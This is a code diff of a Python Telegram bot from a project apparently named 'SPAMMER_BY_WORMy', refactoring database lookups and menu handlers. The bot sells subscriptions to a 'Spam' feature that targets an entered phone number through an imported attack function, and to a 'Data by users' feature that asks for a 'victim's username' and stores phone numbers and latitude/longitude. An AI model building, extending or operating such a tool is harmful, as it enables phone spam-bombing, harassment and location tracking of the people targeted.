@@ -1,15 +1,14 @@
-import string
-import random
-import json
-import sqlite3
-import folium
 import os
+import json
+import random
+import folium
+import string
+import sqlite3
 import phonenumbers as ph
 
-from bot_funcs.main_of_da_funcs import atack_function
-from telebot import types as ty
 from telebot import TeleBot
-
+from telebot import types as ty
+from bot_funcs.main_of_da_funcs import atack_function
 
 with open('SPAMMER_BY_WORMy/config.json') as file:
     config = json.load(file)
@@ -30,8 +29,16 @@ url = config.get('url')
 current_promocode = None
 my_id = config.get('tg_id')
 bot = TeleBot(config.get('token'))
-path = str(os.path.abspath('SPAMMER_BY_WORMy/SPAMMER_BY_WORMyy/databases').replace("\\","/") + "/")
 index = str(os.path.abspath('SPAMMER_BY_WORMy/SPAMMER_BY_WORMyy/index').replace("\\","/") + "/")
+path = str(os.path.abspath('SPAMMER_BY_WORMy/SPAMMER_BY_WORMyy/databases').replace("\\","/") + "/")
+cancel = ty.InlineKeyboardMarkup(keyboard=[[ty.InlineKeyboardButton(text='❌ Cancel option', callback_data='main_menu')]])
+
+def db_request(id):
+    db = sqlite3.connect(f'{path}data.db')
+    cure = db.cursor()    
+    db.execute('CREATE TABLE IF NOT EXISTS data(un text,pn text,id integer ,st integer, la text, lo text)')
+    cure.execute("SELECT * FROM data WHERE id =?", [id])
+    return cure.fetchone()
 
 @bot.message_handler(commands=['gen_promo'])
 def gen_promo(message):
@@ -45,11 +52,7 @@ def gen_promo(message):
 
 @bot.message_handler(commands=['start'])
 def _init_(message):
-    db = sqlite3.connect(f'{path}data.db')
-    cure = db.cursor()    
-    db.execute('CREATE TABLE IF NOT EXISTS data(un text,pn text,id integer ,st integer, la text, lo text)')
-    cure.execute("SELECT * FROM data WHERE id =?", [message.from_user.id])
-    fetchone = cure.fetchone()
+    fetchone = db_request(message.from_user.id)
     if fetchone is not None:
         bot.send_message(message.from_user.id, '💼 You are registered in this bot!', reply_markup=ty.InlineKeyboardMarkup(keyboard=[[ty.InlineKeyboardButton(text='🗑 Delete message',callback_data='del_data')]]))
         if message.from_user.id not in uid_bool:
@@ -102,13 +105,14 @@ def callback(call):
                 dict_.pop(call.from_user.id)
             except:
                 continue
+        fetchone = db_request(call.from_user.id)
+        if call.from_user.id not in uid_bool and fetchone is not None:
+            uid_bool.update([(fetchone[2], bool(int(fetchone[3])))])
         bot.clear_step_handler_by_chat_id(call.message.chat.id)
-        cancel = ty.InlineKeyboardMarkup(keyboard=[[ty.InlineKeyboardButton(text='❌ Cancel option', callback_data='main_menu')]])
         main_keyboard = ty.InlineKeyboardMarkup(keyboard=[[ty.InlineKeyboardButton(text='🎯 Spam',callback_data='spam'),ty.InlineKeyboardButton(text='📱 Data by users',callback_data='get_data')],[ty.InlineKeyboardButton(text='🔑 Subscription',callback_data='sub'),]])
         bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f'🎈 Your current destination\'s main menu\n\n🔋 Your subscription is {"activated" if uid_bool.get(call.from_user.id) else "deactivated"}',reply_markup=main_keyboard)
     
     elif call.data == 'spam':
-        
         if uid_bool.get(call.from_user.id):
             spam_message=bot.edit_message_text(chat_id=call.message.chat.id,message_id= call.message.message_id, text='⏳ Please input your phone number below.\n\n🌀 Example: 79236723802',reply_markup=cancel)
             spam_message_.update([(call.from_user.id, spam_message)])
@@ -117,7 +121,6 @@ def callback(call):
             activate_your_promo(call.message)
     
     elif call.data == 'get_data':
-        
         if uid_bool.get(call.from_user.id):
             data_message=bot.edit_message_text(chat_id=call.message.chat.id,message_id= call.message.message_id, text='⏳ Please input your victim\'s username to we may continue.\n\n🌀 Username must look like this: @AxisModel014',reply_markup=cancel)
             data_message_.update([(call.from_user.id,data_message)])
@@ -125,8 +128,7 @@ def callback(call):
         else:
             activate_your_promo(call.message)
             
-    elif call.data == 'del_data':
-        
+    elif call.data == 'del_data':    
         try:
             bot.delete_message(message_id=call.message.message_id, chat_id=call.message.chat.id)
         except:
